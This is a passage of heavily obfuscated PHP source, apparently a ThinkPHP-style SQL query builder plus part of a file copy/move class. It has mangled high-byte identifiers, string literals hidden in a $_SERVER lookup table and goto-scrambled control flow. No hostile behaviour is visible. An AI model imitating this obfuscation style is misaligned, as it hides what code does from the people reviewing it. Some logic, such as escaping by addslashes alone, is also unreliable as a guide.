($C¥Ü™˜Ö÷¨[277] == $D‡Šİ) { $dË³»¿Ş…˜ .= $C¥Ü™˜Ö÷¨[569] . $Fó¹‡‰°šô . $C¥Ü™˜Ö÷¨[50] . $eˆ³ƒÄ¯ë¤[1] . $C¥Ü™˜Ö÷¨[687]; } elseif (preg_match($C¥Ü™˜Ö÷¨[688], $eˆ³ƒÄ¯ë¤[0])) { if (isset($eˆ³ƒÄ¯ë¤[2]) && $C¥Ü™˜Ö÷¨[277] == $eˆ³ƒÄ¯ë¤[2]) { $dË³»¿Ş…˜ .= $Fó¹‡‰°šô . $C¥Ü™˜Ö÷¨[50] . $this->exp[$D‡Šİ] . $C¥Ü™˜Ö÷¨[50] . $eˆ³ƒÄ¯ë¤[1]; } else { if (is_string($eˆ³ƒÄ¯ë¤[1])) { $eˆ³ƒÄ¯ë¤[1] = explode($C¥Ü™˜Ö÷¨[47], $eˆ³ƒÄ¯ë¤[1]); } $f¶ƒ¿™áíĞ = implode($C¥Ü™˜Ö÷¨[47], $this->parseValue($eˆ³ƒÄ¯ë¤[1])); $dË³»¿Ş…˜ .= $Fó¹‡‰°šô . $C¥Ü™˜Ö÷¨[50] . $this->exp[$D‡Šİ] . $C¥Ü™˜Ö÷¨[569] . $f¶ƒ¿™áíĞ . $C¥Ü™˜Ö÷¨[571]; } } elseif (preg_match($C¥Ü™˜Ö÷¨[689], $eˆ³ƒÄ¯ë¤[0])) { $a‰¬éÒ¬´‘ = is_string($eˆ³ƒÄ¯ë¤[1]) ? explode($C¥Ü™˜Ö÷¨[47], $eˆ³ƒÄ¯ë¤[1]) : $eˆ³ƒÄ¯ë¤[1]; $dË³»¿Ş…˜ .= $C¥Ü™˜Ö÷¨[569] . $Fó¹‡‰°šô . $C¥Ü™˜Ö÷¨[50] . $this->exp[$D‡Šİ] . $C¥Ü™˜Ö÷¨[50] . $this->parseValue($a‰¬éÒ¬´‘[0]) . $C¥Ü™˜Ö÷¨[673] . $this->parseValue($a‰¬éÒ¬´‘[1]) . $C¥Ü™˜Ö÷¨[258]; } else { think_exception(think_lang($C¥Ü™˜Ö÷¨[676]) . $C¥Ü™˜Ö÷¨[4] . $eˆ³ƒÄ¯ë¤[0]); } } else { $e÷¥Ñ‚¨Ù = count($eˆ³ƒÄ¯ë¤); $aŸÙäÒİÓî = isset($eˆ³ƒÄ¯ë¤[$e÷¥Ñ‚¨Ù - 1]) ? strtoupper($eˆ³ƒÄ¯ë¤[$e÷¥Ñ‚¨Ù - 1]) : $C¥Ü™˜Ö÷¨[33]; if (in_array($aŸÙäÒİÓî, array($C¥Ü™˜Ö÷¨[670], $C¥Ü™˜Ö÷¨[671], $C¥Ü™˜Ö÷¨[672]))) { $e÷¥Ñ‚¨Ù = $e÷¥Ñ‚¨Ù - 1; } else { $aŸÙäÒİÓî = $C¥Ü™˜Ö÷¨[670]; } for ($eÜ¡¶ µ‡ò = 0; $eÜ¡¶ µ‡ò < $e÷¥Ñ‚¨Ù; $eÜ¡¶ µ‡ò++) { $a‰¬éÒ¬´‘ = is_array($eˆ³ƒÄ¯ë¤[$eÜ¡¶ µ‡ò]) ? $eˆ³ƒÄ¯ë¤[$eÜ¡¶ µ‡ò][1] : $eˆ³ƒÄ¯ë¤[$eÜ¡¶ µ‡ò]; if ($C¥Ü™˜Ö÷¨[277] == strtolower($eˆ³ƒÄ¯ë¤[$eÜ¡¶ µ‡ò][0])) { $dË³»¿Ş…˜ .= $C¥Ü™˜Ö÷¨[240] . $Fó¹‡‰°šô . $C¥Ü™˜Ö÷¨[50] . $a‰¬éÒ¬´‘ . $C¥Ü™˜Ö÷¨[687] . $aŸÙäÒİÓî . $C¥Ü™˜Ö÷¨[50]; } else { $a„Õ·µ‚ÅÓ = is_array($eˆ³ƒÄ¯ë¤[$eÜ¡¶ µ‡ò]) ? $this->exp[strtolower($eˆ³ƒÄ¯ë¤[$eÜ¡¶ µ‡ò][0])] : $C¥Ü™˜Ö÷¨[662]; if (!$a„Õ·µ‚ÅÓ && is_array($eˆ³ƒÄ¯ë¤[$eÜ¡¶ µ‡ò]) && in_array($eˆ³ƒÄ¯ë¤[$eÜ¡¶ µ‡ò][0], array($C¥Ü™˜Ö÷¨[662], $C¥Ü™˜Ö÷¨[680], $C¥Ü™˜Ö÷¨[681], $C¥Ü™˜Ö÷¨[682], $C¥Ü™˜Ö÷¨[683], $C¥Ü™˜Ö÷¨[684]))) { $a„Õ·µ‚ÅÓ = $eˆ³ƒÄ¯ë¤[$eÜ¡¶ µ‡ò][0]; } $dË³»¿Ş…˜ .= $C¥Ü™˜Ö÷¨[240] . $Fó¹‡‰°šô . $C¥Ü™˜Ö÷¨[50] . $a„Õ·µ‚ÅÓ . $C¥Ü™˜Ö÷¨[50] . $this->parseValue($a‰¬éÒ¬´‘) . $C¥Ü™˜Ö÷¨[687] . $aŸÙäÒİÓî . $C¥Ü™˜Ö÷¨[50]; } } $dË³»¿Ş…˜ = substr($dË³»¿Ş…˜, 0, -4); } } else { $dË³»¿Ş…˜ .= $Fó¹‡‰°šô . $C¥Ü™˜Ö÷¨[690] . $this->parseValue($eˆ³ƒÄ¯ë¤); } return $dË³»¿Ş…˜; } protected function parseThinkWhere($C’¢íğÈœ, $F‚¢²°¯ÕØ) { $d¥Ô°¨œ«İ =& $_SERVER[ÍÓÖ€°å]; $DÅáŠŸñß¬ = $d¥Ô°¨œ«İ[33]; switch ($C’¢íğÈœ) { case $d¥Ô°¨œ«İ[330]: $DÅáŠŸñß¬ = $F‚¢²°¯ÕØ; break; case $d¥Ô°¨œ«İ[674]: $DÅáŠŸñß¬ = is_string($F‚¢²°¯ÕØ) ? $F‚¢²°¯ÕØ : substr($this->parseWhere($F‚¢²°¯ÕØ), 6); break; case $d¥Ô°¨œ«İ[691]: parse_str($F‚¢²°¯ÕØ, $BÚ˜èì…); if (isset($BÚ˜èì…[$d¥Ô°¨œ«İ[669]])) { $Eàí™¯²Çé = $d¥Ô°¨œ«İ[50] . strtoupper($BÚ˜èì…[$d¥Ô°¨œ«İ[669]]) . $d¥Ô°¨œ«İ[50]; unset($BÚ˜èì…[$d¥Ô°¨œ«İ[669]]); } else { $Eàí™¯²Çé = $d¥Ô°¨œ«İ[673]; } $då˜© ‚£õ = array(); foreach ($BÚ˜èì… as $Cİ™İ¾ò»Ñ => $aØÔ„Ë¬¸‡) { $då˜© ‚£õ[] = $this->parseKey($Cİ™İ¾ò»Ñ) . $d¥Ô°¨œ«İ[690] . $this->parseValue($aØÔ„Ë¬¸‡); } $DÅáŠŸñß¬ = implode($Eàí™¯²Çé, $då˜© ‚£õ); break; } return $DÅáŠŸñß¬; } protected function parseLimit($BÑø±±‚†¨) { $dùœ„ÚÃ°‹ =& $_SERVER[ÍÓÖ€°å]; return !empty($BÑø±±‚†¨) ? $dùœ„ÚÃ°‹[48] . $BÑø±±‚†¨ . $dùœ„ÚÃ°‹[50] : $dùœ„ÚÃ°‹[33]; } protected function parseJoin($d›ÅˆÙ®„) { $eø«É…ó§ =& $_SERVER[ÍÓÖ€°å]; $eßä‹àµ³£ = $eø«É…ó§[33]; if (!empty($d›ÅˆÙ®„)) { if (is_array($d›ÅˆÙ®„)) { foreach ($d›ÅˆÙ®„ as $f–Ï‹¨ä„ë => $dĞ¶î–À›Ç) { if (!1 !== stripos($dĞ¶î–À›Ç, $eø«É…ó§[692])) { $eßä‹àµ³£ .= $eø«É…ó§[50] . $dĞ¶î–À›Ç; } else { $eßä‹àµ³£ .= $eø«É…ó§[693] . $dĞ¶î–À›Ç; } } } else { $eßä‹àµ³£ .= $eø«É…ó§[693] . $d›ÅˆÙ®„; } } $eßä‹àµ³£ = preg_replace($eø«É…ó§[694], think_config($eø«É…ó§[597]) . $eø«É…ó§[695], $eßä‹àµ³£); return $eßä‹àµ³£; } protected function parseOrder($EÔø³Ò¾Çç) { $dĞì‚ßˆÈù =& $_SERVER[ÍÓÖ€°å]; if (is_array($EÔø³Ò¾Çç)) { $DìŠ˜‘œø = array(); foreach ($EÔø³Ò¾Çç as $fì–ï‹•ëÊ => $a²›„åçÃâ) { if (is_numeric($fì–ï‹•ëÊ)) { $DìŠ˜‘œø[] = $this->parseKey($a²›„åçÃâ); } else { $a²›„åçÃâ = in_array(strtoupper(trim($a²›„åçÃâ)), array($dĞì‚ßˆÈù[696], $dĞì‚ßˆÈù[697])) ? $dĞì‚ßˆÈù[50] . $a²›„åçÃâ : $dĞì‚ßˆÈù[33]; if (preg_match($dĞì‚ßˆÈù[698], $fì–ï‹•ëÊ)) { $DìŠ˜‘œø[] = $this->parseKey($fì–ï‹•ëÊ) . $a²›„åçÃâ; } else { think_exception($dĞì‚ßˆÈù[699] . $fì–ï‹•ëÊ); } } } $EÔø³Ò¾Çç = implode($dĞì‚ßˆÈù[47], $DìŠ˜‘œø); } return !empty($EÔø³Ò¾Çç) ? $dĞì‚ßˆÈù[700] . $EÔø³Ò¾Çç : $dĞì‚ßˆÈù[33]; } protected function parseGroup($C–à„ É¬µ) { $dºˆœÑ³Â =& $_SERVER[ÍÓÖ€°å]; return !empty($C–à„ É¬µ) ? $dºˆœÑ³Â[701] . $C–à„ É¬µ : $dºˆœÑ³Â[33]; } protected function parseHaving($AŠ‹âÙíïÓ) { $fŠ¿²å¼º =& $_SERVER[ÍÓÖ€°å]; return !empty($AŠ‹âÙíïÓ) ? $fŠ¿²å¼º[702] . $AŠ‹âÙíïÓ : $fŠ¿²å¼º[33]; } protected function parseComment($DŠ‹Œ™İ©) { $CˆÇŸÅÖÉ =& $_SERVER[ÍÓÖ€°å]; return !empty($DŠ‹Œ™İ©) ? $CˆÇŸÅÖÉ[703] . $DŠ‹Œ™İ© . $CˆÇŸÅÖÉ[704] : $CˆÇŸÅÖÉ[33]; } protected function parseDistinct($dÙÔÄìÎ‡è) { $cÆ‡ÒÌÁÎ¬ =& $_SERVER[ÍÓÖ€°å]; return !empty($dÙÔÄìÎ‡è) ? $cÆ‡ÒÌÁÎ¬[705] : $cÆ‡ÒÌÁÎ¬[33]; } protected function parseUnion($B¿Â®Í²Á•) { $b¬¼ìÇĞÄğ =& $_SERVER[ÍÓÖ€°å]; if (empty($B¿Â®Í²Á•)) { return $b¬¼ìÇĞÄğ[33]; } if (isset($B¿Â®Í²Á•[$b¬¼ìÇĞÄğ[328]])) { $eù×·ˆŸ÷™ = $b¬¼ìÇĞÄğ[706]; unset($B¿Â®Í²Á•[$b¬¼ìÇĞÄğ[328]]); } else { $eù×·ˆŸ÷™ = $b¬¼ìÇĞÄğ[707]; } foreach ($B¿Â®Í²Á• as $A‚¬ŠÅ˜­) { $E‚¢¦ÜÂì‡[] = $eù×·ˆŸ÷™ . (is_array($A‚¬ŠÅ˜­) ? $this->buildSelectSql($A‚¬ŠÅ˜­) : $A‚¬ŠÅ˜­); } return implode($b¬¼ìÇĞÄğ[50], $E‚¢¦ÜÂì‡); } public function insert($C¥‹†¨››ª, $f¡¿¶ÂÒó = array(), $bŞÕß™õ¥ = false) { goto A Ëø‡¯•–; C­˜ÏÏ¸¥—: foreach ($C¥‹†¨››ª as $eéáàŒóè¿ => $CÀäÓŒò) { if (is_array($CÀäÓŒò) && $eçğÑå…–Ê[277] == $CÀäÓŒò[0]) { $eˆÕäœ‘Åí[] = $this->parseKey($eéáàŒóè¿); $C×óÁòÁ¾ø[] = $CÀäÓŒò[1]; } elseif (is_scalar($CÀäÓŒò) || is_null($CÀäÓŒò)) { $eˆÕäœ‘Åí[] = $this->parseKey($eéáàŒóè¿); $C×óÁòÁ¾ø[] = $this->parseValue($CÀäÓŒò); } } $Cª¤ËŞŞÑ = ($bŞÕß™õ¥ ? $eçğÑå…–Ê[573] : $eçğÑå…–Ê[574]) . $eçğÑå…–Ê[575] . $this->parseTable($f¡¿¶ÂÒó[$eçğÑå…–Ê[259]]) . $eçğÑå…–Ê[569] . implode($eçğÑå…–Ê[47], $eˆÕäœ‘Åí) . $eçğÑå…–Ê[570] . implode($eçğÑå…–Ê[47], $C×óÁòÁ¾ø) . $eçğÑå…–Ê[571]; $Cª¤ËŞŞÑ .= $this->parseLock(isset($f¡¿¶ÂÒó[$eçğÑå…–Ê[528]]) ? $f¡¿¶ÂÒó[$eçğÑå…–Ê[528]] : !1); goto b¤§‰¢îÔ; A Ëø‡¯•–: $eçğÑå…–Ê =& $_SERVER[ÍÓÖ€°å]; $C×óÁòÁ¾ø = $eˆÕäœ‘Åí = array(); $this->model = $f¡¿¶ÂÒó[$eçğÑå…–Ê[261]]; goto C­˜ÏÏ¸¥—; b¤§‰¢îÔ: $Cª¤ËŞŞÑ .= $this->parseComment(!empty($f¡¿¶ÂÒó[$eçğÑå…–Ê[332]]) ? $f¡¿¶ÂÒó[$eçğÑå…–Ê[332]] : $eçğÑå…–Ê[33]); return $this->execute($Cª¤ËŞŞÑ, $this->parseBind(!empty($f¡¿¶ÂÒó[$eçğÑå…–Ê[265]]) ? $f¡¿¶ÂÒó[$eçğÑå…–Ê[265]] : array())); goto A§øÙĞ«“Õ; A§øÙĞ«“Õ: } public function selectInsert($Dçğà†õ•¶, $F³³äÊ…àÃ, $E¨Ş„‘‘±¯ = array()) { goto Cê±ãß¼ÏÊ; F•¦«¥Ş¬Á: return $this->execute($Eä„•È«Û, $this->parseBind(!empty($E¨Ş„‘‘±¯[$B¼“´êÎÒ«[265]]) ? $E¨Ş„‘‘±¯[$B¼“´êÎÒ«[265]] : array())); goto dğÚçœãñÖ; Cê±ãß¼ÏÊ: $B¼“´êÎÒ« =& $_SERVER[ÍÓÖ€°å]; $this->model = $E¨Ş„‘‘±¯[$B¼“´êÎÒ«[261]]; if (is_string($Dçğà†õ•¶)) { $Dçğà†õ•¶ = explode($B¼“´êÎÒ«[47], $Dçğà†õ•¶); } goto Eƒ¬òáÓ«; Eƒ¬òáÓ«: array_walk($Dçğà†õ•¶, array($this, $B¼“´êÎÒ«[572])); $Eä„•È«Û = $B¼“´êÎÒ«[708] . $this->parseTable($F³³äÊ…àÃ) . $B¼“´êÎÒ«[569] . implode($B¼“´êÎÒ«[47], $Dçğà†õ•¶) . $B¼“´êÎÒ«[687]; $Eä„•È«Û .= $this->buildSelectSql($E¨Ş„‘‘±¯); goto F•¦«¥Ş¬Á; dğÚçœãñÖ: } public function update($B°­èí¨µ, $CÇõ¥øîµÅ) { $BæÔÁ¶ƒ½ó =& $_SERVER[ÍÓÖ€°å]; $this->model = $CÇõ¥øîµÅ[$BæÔÁ¶ƒ½ó[261]]; $EÇŠµ¯ö·š = $BæÔÁ¶ƒ½ó[709] . $this->parseTable($CÇõ¥øîµÅ[$BæÔÁ¶ƒ½ó[259]]) . $this->parseSet($B°­èí¨µ) . $this->parseWhere(!empty($CÇõ¥øîµÅ[$BæÔÁ¶ƒ½ó[255]]) ? $CÇõ¥øîµÅ[$BæÔÁ¶ƒ½ó[255]] : $BæÔÁ¶ƒ½ó[33]) . $this->parseOrder(!empty($CÇõ¥øîµÅ[$BæÔÁ¶ƒ½ó[341]]) ? $CÇõ¥øîµÅ[$BæÔÁ¶ƒ½ó[341]] : $BæÔÁ¶ƒ½ó[33]) . $this->parseLimit(!empty($CÇõ¥øîµÅ[$BæÔÁ¶ƒ½ó[272]]) ? $CÇõ¥øîµÅ[$BæÔÁ¶ƒ½ó[272]] : $BæÔÁ¶ƒ½ó[33]) . $this->parseLock(isset($CÇõ¥øîµÅ[$BæÔÁ¶ƒ½ó[528]]) ? $CÇõ¥øîµÅ[$BæÔÁ¶ƒ½ó[528]] : !1) . $this->parseComment(!empty($CÇõ¥øîµÅ[$BæÔÁ¶ƒ½ó[332]]) ? $CÇõ¥øîµÅ[$BæÔÁ¶ƒ½ó[332]] : $BæÔÁ¶ƒ½ó[33]); return $this->execute($EÇŠµ¯ö·š, $this->parseBind(!empty($CÇõ¥øîµÅ[$BæÔÁ¶ƒ½ó[265]]) ? $CÇõ¥øîµÅ[$BæÔÁ¶ƒ½ó[265]] : array())); } public function delete($Fƒ¥™ßùİ = array()) { $Dš»×Ø›˜‘ =& $_SERVER[ÍÓÖ€°å]; $this->model = $Fƒ¥™ßùİ[$Dš»×Ø›˜‘[261]]; $Eß³ŞŒ¦Î¨ = $Dš»×Ø›˜‘[710] . $this->parseTable($Fƒ¥™ßùİ[$Dš»×Ø›˜‘[259]]) . $this->parseWhere(!empty($Fƒ¥™ßùİ[$Dš»×Ø›˜‘[255]]) ? $Fƒ¥™ßùİ[$Dš»×Ø›˜‘[255]] : $Dš»×Ø›˜‘[33]) . $this->parseOrder(!empty($Fƒ¥™ßùİ[$Dš»×Ø›˜‘[341]]) ? $Fƒ¥™ßùİ[$Dš»×Ø›˜‘[341]] : $Dš»×Ø›˜‘[33]) . $this->parseLimit(!empty($Fƒ¥™ßùİ[$Dš»×Ø›˜‘[272]]) ? $Fƒ¥™ßùİ[$Dš»×Ø›˜‘[272]] : $Dš»×Ø›˜‘[33]) . $this->parseLock(isset($Fƒ¥™ßùİ[$Dš»×Ø›˜‘[528]]) ? $Fƒ¥™ßùİ[$Dš»×Ø›˜‘[528]] : !1) . $this->parseComment(!empty($Fƒ¥™ßùİ[$Dš»×Ø›˜‘[332]]) ? $Fƒ¥™ßùİ[$Dš»×Ø›˜‘[332]] : $Dš»×Ø›˜‘[33]); return $this->execute($Eß³ŞŒ¦Î¨, $this->parseBind(!empty($Fƒ¥™ßùİ[$Dš»×Ø›˜‘[265]]) ? $Fƒ¥™ßùİ[$Dš»×Ø›˜‘[265]] : array())); } public function select($A”‰Ö¬Ë± = array()) { goto aãÅÀ•Ğ´¢; B´õ–ŸõìÌ: if ($BÁáÓÚÖ‡ù && !1 !== $D˜¿Ï³¿²ê) { think_cache($e…ò¤Õ™Ä, $D˜¿Ï³¿²ê, $BÁáÓÚÖ‡ù); } return $D˜¿Ï³¿²ê; goto F¼øØ²Ñç²; c³¡Á±øÃ: $BÁáÓÚÖ‡ù = isset($A”‰Ö¬Ë±[$e’Ğ¯¨—‡•[329]]) ? $A”‰Ö¬Ë±[$e’Ğ¯¨—‡•[329]] : !1; if ($BÁáÓÚÖ‡ù) { $e…ò¤Õ™Ä = is_string($BÁáÓÚÖ‡ù[$e’Ğ¯¨—‡•[88]]) ? $BÁáÓÚÖ‡ù[$e’Ğ¯¨—‡•[88]] : $e’Ğ¯¨—‡•[711] . md5($aˆØ½‡Î¿Ù); $dèØŞ«Á°â = think_cache($e…ò¤Õ™Ä, $e’Ğ¯¨—‡•[33], $BÁáÓÚÖ‡ù); if (!1 !== $dèØŞ«Á°â) { return $dèØŞ«Á°â; } } $D˜¿Ï³¿²ê = $this->query($aˆØ½‡Î¿Ù, $this->parseBind(!empty($A”‰Ö¬Ë±[$e’Ğ¯¨—‡•[265]]) ? $A”‰Ö¬Ë±[$e’Ğ¯¨—‡•[265]] : array())); goto B´õ–ŸõìÌ; aãÅÀ•Ğ´¢: $e’Ğ¯¨—‡• =& $_SERVER[ÍÓÖ€°å]; $this->model = $A”‰Ö¬Ë±[$e’Ğ¯¨—‡•[261]]; $aˆØ½‡Î¿Ù = $this->buildSelectSql($A”‰Ö¬Ë±); goto c³¡Á±øÃ; F¼øØ²Ñç²: } public function buildSelectSql($BËƒŒìÇã = array()) { goto bóÒãÜ¹áÇ; BË¬­…È„: return $eÅå’ªñ¥; goto Eš‚óíïíº; AÖ›Î¦¤¨: $eÅå’ªñ¥ = $this->parseSql($this->selectSql, $BËƒŒìÇã); $eÅå’ªñ¥ .= $this->parseLock(isset($BËƒŒìÇã[$Aè½×…Ç‹[528]]) ? $BËƒŒìÇã[$Aè½×…Ç‹[528]] : !1); if (isset($A‡Š•©†°Ã)) { think_cache($A‡Š•©†°Ã, $eÅå’ªñ¥); } goto BË¬­…È„; bóÒãÜ¹áÇ: $Aè½×…Ç‹ =& $_SERVER[ÍÓÖ€°å]; if (isset($BËƒŒìÇã[$Aè½×…Ç‹[331]])) { if (strpos($BËƒŒìÇã[$Aè½×…Ç‹[331]], $Aè½×…Ç‹[47])) { list($EòƒêÊ‡ï, $B·ÊãÓÙ„®) = explode($Aè½×…Ç‹[47], $BËƒŒìÇã[$Aè½×…Ç‹[331]]); } else { $EòƒêÊ‡ï = $BËƒŒìÇã[$Aè½×…Ç‹[331]]; } $EòƒêÊ‡ï = $EòƒêÊ‡ï ? $EòƒêÊ‡ï : 1; $B·ÊãÓÙ„® = isset($B·ÊãÓÙ„®) ? $B·ÊãÓÙ„® : (is_numeric($BËƒŒìÇã[$Aè½×…Ç‹[272]]) ? $BËƒŒìÇã[$Aè½×…Ç‹[272]] : 20); $B¢çìô×Ÿ™ = $B·ÊãÓÙ„® * ((int) $EòƒêÊ‡ï - 1); $BËƒŒìÇã[$Aè½×…Ç‹[272]] = $B¢çìô×Ÿ™ . $Aè½×…Ç‹[47] . $B·ÊãÓÙ„®; } if (think_config($Aè½×…Ç‹[712])) { $A‡Š•©†°Ã = $Aè½×…Ç‹[713] . md5(serialize($BËƒŒìÇã)); $bóïğÃéØ¾ = think_cache($A‡Š•©†°Ã); if ($bóïğÃéØ¾) { return $bóïğÃéØ¾; } } goto AÖ›Î¦¤¨; Eš‚óíïíº: } public function parseSql($FÒÓ‹Á„š, $eƒ‚ø¹‘Ã‰ = array()) { $a´ìè†‡ˆç =& $_SERVER[ÍÓÖ€°å]; $FÒÓ‹Á„š = str_replace(array($a´ìè†‡ˆç[714], $a´ìè†‡ˆç[715], $a´ìè†‡ˆç[716], $a´ìè†‡ˆç[717], $a´ìè†‡ˆç[718], $a´ìè†‡ˆç[719], $a´ìè†‡ˆç[720], $a´ìè†‡ˆç[721], $a´ìè†‡ˆç[722], $a´ìè†‡ˆç[723], $a´ìè†‡ˆç[724]), array($this->parseTable("{$eƒ‚ø¹‘Ã‰[$a´ìè†‡ˆç[259]]}"), $this->parseDistinct(isset($eƒ‚ø¹‘Ã‰[$a´ìè†‡ˆç[725]]) ? $eƒ‚ø¹‘Ã‰[$a´ìè†‡ˆç[725]] : !1), $this->parseField(!empty($eƒ‚ø¹‘Ã‰[$a´ìè†‡ˆç[253]]) ? $eƒ‚ø¹‘Ã‰[$a´ìè†‡ˆç[253]] : $a´ìè†‡ˆç[164]), $this->parseJoin(!empty($eƒ‚ø¹‘Ã‰[$a´ìè†‡ˆç[262]]) ? $eƒ‚ø¹‘Ã‰[$a´ìè†‡ˆç[262]] : $a´ìè†‡ˆç[33]), $this->parseWhere(!empty($eƒ‚ø¹‘Ã‰[$a´ìè†‡ˆç[255]]) ? $eƒ‚ø¹‘Ã‰[$a´ìè†‡ˆç[255]] : $a´ìè†‡ˆç[33]), $this->parseGroup(!empty($eƒ‚ø¹‘Ã‰[$a´ìè†‡ˆç[726]]) ? $eƒ‚ø¹‘Ã‰[$a´ìè†‡ˆç[726]] : $a´ìè†‡ˆç[33]), $this->parseHaving(!empty($eƒ‚ø¹‘Ã‰[$a´ìè†‡ˆç[727]]) ? $eƒ‚ø¹‘Ã‰[$a´ìè†‡ˆç[727]] : $a´ìè†‡ˆç[33]), $this->parseOrder(!empty($eƒ‚ø¹‘Ã‰[$a´ìè†‡ˆç[341]]) ? $eƒ‚ø¹‘Ã‰[$a´ìè†‡ˆç[341]] : $a´ìè†‡ˆç[33]), $this->parseLimit(!empty($eƒ‚ø¹‘Ã‰[$a´ìè†‡ˆç[272]]) ? $eƒ‚ø¹‘Ã‰[$a´ìè†‡ˆç[272]] : $a´ìè†‡ˆç[33]), $this->parseUnion(!empty($eƒ‚ø¹‘Ã‰[$a´ìè†‡ˆç[327]]) ? $eƒ‚ø¹‘Ã‰[$a´ìè†‡ˆç[327]] : $a´ìè†‡ˆç[33]), $this->parseComment(!empty($eƒ‚ø¹‘Ã‰[$a´ìè†‡ˆç[332]]) ? $eƒ‚ø¹‘Ã‰[$a´ìè†‡ˆç[332]] : $a´ìè†‡ˆç[33])), $FÒÓ‹Á„š); return $FÒÓ‹Á„š; } public function getLastSql($BÎ”ë©¨ÓÒ = '') { return $BÎ”ë©¨ÓÒ ? $this->modelSql[$BÎ”ë©¨ÓÒ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($Fµ¨ìÁÊ¿) { return addslashes($Fµ¨ìÁÊ¿); } public function setModel($c„ÌìÇ‚Ù) { $this->model = $c„ÌìÇ‚Ù; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($EË„äˆ¯˜©, $aˆ‡Å˜¢) { $a²„Ÿƒ…Š¥ = self::driverMake($aˆ‡Å˜¢[0]); if (method_exists($a²„Ÿƒ…Š¥, $EË„äˆ¯˜©)) { return @call_user_func_array(array($a²„Ÿƒ…Š¥, $EË„äˆ¯˜©), $aˆ‡Å˜¢); } else { if (method_exists(self, $EË„äˆ¯˜©)) { return @call_user_func_array(array(self, $EË„äˆ¯˜©), $aˆ‡Å˜¢); } else { call_user_func_array(array(parent, $EË„äˆ¯˜©), $aˆ‡Å˜¢); } } } public static function init($FÓç¸µºÆó) { return self::driverMake($FÓç¸µºÆó); } public static function copy($C‘ÎêëäÉ«, $DÃæìéÒ¡•, $eÄÂ›Ûä©” = false) { return self::copyMove($C‘ÎêëäÉ«, $DÃæìéÒ¡•, $eÄÂ›Ûä©”, $_SERVER[ÍÓÖ€°å][728]); } public static function move($fî Æ¬Ü±†, $E­ï²±ìØ­, $E½˜…µìõ = false) { return self::copyMove($fî Æ¬Ü±†, $E­ï²±ìØ­, $E½˜…µìõ, $_SERVER[ÍÓÖ€°å][729]); } public static function saveFile($bñÜ Æ¾Ï, $cšĞ¨ğí»ó, $A’µ¤¼‹³Ë = true) { goto D¹ˆ¡ÅŒ¥Ô; D¹ˆ¡ÅŒ¥Ô: $E†ÖÀ¾³£ = self::info($cšĞ¨ğí»ó); $eÇõİ˜Ë‹ = self::driverMake($bñÜ Æ¾Ï); $AÅÒ‰Â = self::driverMake($cšĞ¨ğí»ó); goto fÅáˆ¿Â®œ; AóÛ…ºÕ÷‘: return self::copyFile($eÇõİ˜Ë‹, $bñÜ Æ¾Ï, $AÅÒ‰Â, $dÌ„­Ú¬¨§, $E†ÖÀ¾³£[$_SERVER[ÍÓÖ€°å][28]], $dæÙ†’®ùÏ); goto a“šà”ØÖà; fÅáˆ¿Â®œ: $dÌ„­Ú¬¨§ = $AÅÒ‰Â->pathFather($cšĞ¨ğí»ó); $dæÙ†’®ùÏ = !0; if (!$A’µ¤¼‹³Ë && self::driverIsSame($eÇõİ˜Ë‹, $AÅÒ‰Â)) { $dæÙ†’®ùÏ = !1; } goto AóÛ…ºÕ÷‘; a“šà”ØÖà: } private static function copyMove($fæ½ÕŠ, $E÷£êß’íó, $EÉø•¾•÷, $f‰ë„ã) { goto bß¾‚ë•¬; Bä½¸äšŒî: Hook::trigger($f›®¬Ğö´Ş[73], $b‰î‡“‰ÌÑ, $fæ½ÕŠ, $b£Á…›Òñé, $E÷£êß’íó); $f”ê­Ü‡ˆê = self::driverIsSame($b‰î‡“‰ÌÑ, $b£Á…›Òñé); if ($f”ê­Ü‡ˆê) { if ($f‰ë„ã == $f›®¬Ğö´Ş[729] && trim($E÷£êß’íó, $f›®¬Ğö´Ş[8]) == trim($b£Á…›Òñé->pathFather($fæ½ÕŠ), $f›®¬Ğö´Ş[8])) { return $b£Á…›Òñé->getPathOuter($fæ½ÕŠ); } if (method_exists($b£Á…›Òñé, $f‰ë„ã)) { return $b£Á…›Òñé->{$f‰ë„ã}($fæ½ÕŠ, $E÷£êß’íó, $EÉø•¾•÷); } } goto D¸°‘¾‡ìˆ; bß¾‚ë•¬: $f›®¬Ğö´Ş =& $_SERVER[ÍÓÖ€°å]; ignore_timeout(); $b‰î‡“‰ÌÑ = self::driverMake($fæ½ÕŠ); goto AŞå§Æƒ§¯; D¸°‘¾‡ìˆ: $c¿ó•ª›é = $b‰î‡“‰ÌÑ->isFile($fæ½ÕŠ); if (!$c¿ó•ª›é && $b£Á…›Òñé->getType() == $f›®¬Ğö´Ş[442] && $b‰î‡“‰ÌÑ->getType() == $f›®¬Ğö´Ş[125]) { $EÅÈ¬°‡œ = $b£Á…›Òñé->copyFolderFromIO($b‰î‡“‰ÌÑ, $fæ½ÕŠ, $E÷£êß’íó, $EÉø•¾•÷, $C„Ãï¶‰´õ); } else { $EÅÈ¬°‡œ = self::copyPath($b‰î‡“‰ÌÑ, $fæ½ÕŠ, $b£Á…›Òñé, $E÷£êß’íó, $EÉø•¾•÷, $C„Ãï¶‰´õ, $c¿ó•ª›é); } if ($EÅÈ¬°‡œ && $C„Ãï¶‰´õ) { $b‰î‡“‰ÌÑ->remove($fæ½ÕŠ); } goto eä—‚®ØÙß; AŞå§Æƒ§¯: $b£Á…›Òñé = self::driverMake($E÷£êß’íó); $C„Ãï¶‰´õ = $f‰ë„ã == $f›®¬Ğö´Ş[729]; self::check($b‰î‡“‰ÌÑ, $fæ½ÕŠ, $b£Á…›Òñé, $E÷£êß’íó); goto Bä½¸äšŒî; eä—‚®ØÙß: return $EÅÈ¬°‡œ; goto f¦›ÌÚÜ˜ğ; f¦›ÌÚÜ˜ğ: } private static function check($eÇÜÂŒÃÒ, $b¿›©Á…  , $cµ™•‹·‘¤, &$EáÆƒã¬Ñƒ) { $eÌİÖ÷¸Ê© =& $_SERVER[ÍÓÖ€°å]; if (self::driverIsSame($eÇÜÂŒÃÒ, $cµ™•‹·‘¤) && $eÇÜÂŒÃÒ->isFolder($b¿›©Á…  ) && $eÇÜÂŒÃÒ->isParentOf($b¿›©Á…  , $EáÆƒã¬Ñƒ)) { show_json(LNG($eÌİÖ÷¸Ê©[730]), !1); } if 